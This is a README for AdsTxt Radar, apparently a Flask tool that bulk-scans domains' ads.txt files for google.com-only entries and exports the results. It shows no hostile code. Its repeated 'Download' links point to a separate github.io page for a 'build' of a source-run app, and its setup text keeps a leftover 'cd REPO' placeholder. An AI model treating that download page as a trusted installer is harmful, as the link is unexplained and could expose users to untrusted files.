# AdsTxt Radar - ads.txt scanner 2026

> **AdsTxt Radar is a Flask-powered browser scanner that checks ads.txt entries across extensive domain lists and provides live status updates, result filtering, and CSV or Excel export.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/felix-davisnq3350/adstxt-radar-record-checker?style=flat-square)](https://github.com/felix-davisnq3350/adstxt-radar-record-checker)

---

<p align="center">
  <a href="https://felix-davisnq3350.github.io/adstxt-radar-record-checker/">
    <img src="https://img.shields.io/badge/Download-AdsTxt%20Radar%20Latest-brightgreen?style=for-the-badge" alt="Download AdsTxt Radar">
  </a>
</p>

> **[Download AdsTxt Radar Latest](https://felix-davisnq3350.github.io/adstxt-radar-record-checker/)**

---

[Download Latest Build](https://felix-davisnq3350.github.io/adstxt-radar-record-checker/)

---

## Overview

AdsTxt Radar gives publishers, advertising operations teams, and domain analysts a way to examine ads.txt files in bulk. Rather than opening each domain individually, users submit a collection of websites and identify records where `google.com` is the sole demand partner.

The web UI is built for large-scale review. Domain lists may be pasted into the page or loaded from CSV and Excel files, while the scanner displays activity as requests proceed. Once processing is finished, results can be searched, filtered, and exported for additional work.

---

## Key capabilities

- Process hundreds or thousands of domains during a single scan.
- Find domains whose ads.txt records contain only `google.com` as the demand partner.
- Load domain lists from CSV files and Excel workbooks.
- Enter domains directly by pasting them into the interface.
- Choose the level of concurrent request processing.
- Attempt each domain over HTTPS before trying HTTP as a fallback.
- Read ads.txt files while disregarding comments and variable declarations.
- Display current scan progress together with an estimated remaining duration.
- Narrow and search results from the browser.
- Download findings as CSV or formatted Excel output.
- Keep timeouts, 404s, and other request errors in the final results without aborting the overall scan.

---

## Getting started

First clone the project and move into the repository folder:

```bash
git clone https://github.com/felix-davisnq3350/adstxt-radar-record-checker.git
cd REPO
```

Install the required Python packages:

```bash
pip install -r requirements.txt
```

Launch the Flask application through the entry point configured by the project. A typical local command is:

```bash
python app.py
```

After Flask displays its local address, open that address in a browser. You can then paste domains into the scanner or provide a CSV or Excel upload.

---

## Scanning domains

1. Launch AdsTxt Radar in your browser.
2. Supply domains by pasting them into the input field or uploading a CSV or Excel document.
3. Choose the number of parallel requests to use.
4. Begin the scan.
5. Follow the live progress display and its estimated time remaining.
6. Search and filter the completed view to inspect matches and scan errors.
7. Export the finished data as CSV or styled Excel.

Pasted input is expected to use one domain on each line:

```text
example.com
publisher.example
news.example
```

For a bigger scan, create a CSV or Excel file containing the domains, upload it through the application, and inspect the statuses and ads.txt results after processing.

---

## Runtime settings

Scan parallelism is the main runtime control exposed by AdsTxt Radar. Select a concurrency level that fits both the size of the domain list and the resources available to the environment hosting Flask.

```text
Input sources:     Pasted domains, CSV, Excel
Request order:     HTTPS first, HTTP fallback
Parallelism:       Configurable
Output formats:    CSV, styled Excel
```

Keep application-specific options in the Flask project's existing configuration or environment setup. When a desired option is not available in the interface, inspect the repository's configuration files before launching the application.

---

## Prerequisites

- A modern web browser.
- Python capable of running the Flask application.
- Network connectivity to the domains included in a scan.
- Adequate time and system resources for the selected domain volume.
- CSV or Excel files for file-based domain imports.
- Enough storage space for generated CSV or Excel exports.

---

## Frequently asked questions

### Which input formats are supported?

Domains can be entered directly by pasting them into the browser interface, or supplied through a CSV or Excel upload.

### What information does the scanner evaluate?

AdsTxt Radar downloads and parses ads.txt files, skips comments and variable declarations, and detects domains where `google.com` is the only listed demand partner.

### Is it suitable for extensive domain lists?

Yes. The scanner is intended for workloads containing hundreds or thousands of domains, with configurable concurrency for request processing.

### Are failed requests omitted?

No. Timeouts, 404 responses, and other request problems are retained as scan results so they can be investigated rather than disappearing from the job.

### Can the request concurrency be modified?

Yes. Set the parallelism value before starting the scan. The best setting varies with the job size and the machine or environment running the application.

### How can I save the scan output?

The interface provides CSV and styled Excel exports. The export process described here does not require a separate database.

### What should I check if ads.txt information is missing?

Review the domain's reported status, verify that the host can be reached, and determine whether the HTTPS attempt succeeded or whether the scanner used its HTTP fallback. A timeout or 404 may mean that no usable response was returned.

### How are new versions obtained?

Download the repository's latest build or release, review the project changes, and then replace an existing installation as appropriate.

---

## Planned improvements

- Further optimize workflows for large domain collections.
- Continue enhancing in-browser search and result filtering.
- Add more detailed diagnostics for scan failures.
- Preserve and maintain CSV and styled Excel export capabilities.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
